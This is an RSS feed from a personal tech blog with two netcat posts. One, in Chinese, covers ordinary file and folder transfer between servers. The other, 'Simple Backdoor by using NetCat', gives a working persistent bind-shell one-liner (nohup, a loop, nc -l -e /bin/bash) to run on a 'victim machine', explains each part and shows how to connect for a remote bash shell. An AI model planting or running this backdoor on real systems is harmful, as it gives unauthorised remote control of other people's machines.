<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"><channel><title>Just for noting</title><link>https://blog.m157q.tw/</link><description></description><lastBuildDate>Wed, 28 Oct 2015 13:57:00 +0800</lastBuildDate><item><title>Simple File Transmission by using Netcat</title><link>https://blog.m157q.tw/posts/2014/10/22/simple-file-transmission-by-using-netcat/</link><description>&lt;h2&gt;Scenario&lt;/h2&gt;
&lt;p&gt;把檔案從 Server A (傳送方) 傳到 Server B (接收方)&lt;br /&gt;
B(接收方)先用 &lt;code&gt;nc&lt;/code&gt; 把 port 打開&lt;br /&gt;
下面的 &lt;code&gt;$TARGETSERVER&lt;/code&gt; 指的就是 B 的 ip&lt;br /&gt;
A(傳送方)再丟檔案過去  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;不用打包的話 （單一檔案）&lt;/h3&gt;
&lt;p&gt;B : &lt;code&gt;nc -l $PORT &amp;gt; $FILENAME&lt;/code&gt;&lt;br /&gt;
A : &lt;code&gt;cat $FILENAME | nc $TARGETSERVER $PORT&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;如果需要打包的話 （資料夾）&lt;/h3&gt;
&lt;p&gt;以 .tar 為例  &lt;/p&gt;
&lt;p&gt;B : &lt;code&gt;nc -l $PORT | tar xvf -&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;從 &lt;code&gt;stdin&lt;/code&gt; 收到後直接解開成資料夾  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A : &lt;code&gt;tar cvf - $DIRNAME | nc $TARGETSERVER $PORT&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;如果傳到B後不想直接解開&lt;/h4&gt;
&lt;p&gt;ex: 想放在 &lt;code&gt;/usr/ports/distfiles&lt;/code&gt; 裏面  &lt;/p&gt;
&lt;p&gt;B : &lt;code&gt;nc -l $PORT &amp;gt; $DIRNAME.tar&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;收到後直接變成 &lt;code&gt;.tar&lt;/code&gt; 檔  &lt;/p&gt;
&lt;/blockquote&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Wed, 28 Oct 2015 13:57:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2014-10-22:posts/2014/10/22/simple-file-transmission-by-using-netcat/</guid><category>CLI</category><category>NetCat</category><category>nc</category></item><item><title>Simple Backdoor by using NetCat</title><link>https://blog.m157q.tw/posts/2014/07/06/simple-backdoor-by-using-netcat/</link><description>&lt;h2&gt;The one line script&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nohup bash -c &lt;span class="s1"&gt;&amp;#39;while true; do nc -l -e /bin/bash -p ${port}; done&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;How this works&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;nohup&lt;/code&gt; makes this backdoor immune to SIGHUP  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;bash -c ${string}&lt;/code&gt; will run the &lt;code&gt;${string}&lt;/code&gt; as command  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;nc -l&lt;/code&gt; let nc keep listening on the port  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;nc -e ${sth}&lt;/code&gt; means excute &lt;code&gt;${sth}&lt;/code&gt; after connected  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;nc -p&lt;/code&gt; to choose a port for nc to listen  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;${port}&lt;/code&gt; is the backdoor port set on the victim machine.  &lt;ul&gt;
&lt;li&gt;You can change it to a port number whatever you like.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;use shell scripting &lt;code&gt;while&lt;/code&gt; for keeping listening  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;How to use&lt;/h2&gt;
&lt;p&gt;After run the command above on the victim machine, you can just type  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;victim_ip&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;port&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;to connect to the victim machine and get a bash shell as the same uid which ran the command.  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Tue, 27 Oct 2015 12:13:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2014-07-06:posts/2014/07/06/simple-backdoor-by-using-netcat/</guid><category>NetCat</category><category>nc</category><category>Backdoor</category><category>Security</category></item></channel></rss>